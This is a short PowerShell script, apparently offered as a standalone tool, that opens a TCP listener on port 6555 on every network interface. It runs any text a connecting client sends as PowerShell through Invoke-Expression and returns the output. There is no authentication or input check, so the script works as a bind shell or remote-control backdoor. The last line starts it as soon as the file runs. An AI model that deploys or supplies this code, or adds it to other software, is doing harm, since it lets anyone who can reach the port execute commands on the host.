function MySvr([int] $Port)
{
    try
    {
        $EndPoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::any,$Port)
        do
        {
            echo "Server port: $Port"
            $Socket = New-Object System.Net.Sockets.TCPListener($EndPoint)
            $Socket.Start()
            $Client = $Socket.AcceptTCPClient()
            $EncodedText = New-Object System.Text.ASCIIEncoding
            $Stream = $Client.GetStream()
            $Buffer = New-Object System.Byte[] $Client.ReceiveBufferSize   
            $Bytes = $Stream.Read($Buffer,0,$Buffer.Length)
            $msg = $EncodedText.GetString($Buffer,0,$Bytes)
            $msg = $msg.Trim()
            Write-Output $msg
            if ($msg -ne "quit")
            {
                try
                {
                    $msg = iex $msg | Out-String
                    $msg = $msg.Trim()
                    echo "======="
                    echo $msg
                    echo "======="
                }
                catch
                {
                    $msg = "error"
                    echo "cmd error"
                }
            }
            $Writer = New-Object System.IO.StreamWriter($Stream)
            $Writer.AutoFlush = $true
            $Writer.NewLine = $true
            $Writer.Write($msg)
            $Stream.Close()
            $Client.Close()
            $Socket.Stop()
        } until($msg -eq "quit")
        echo "end!!!"
    }
    catch
    {
        echo "catch"
    }
}

MySvr 6555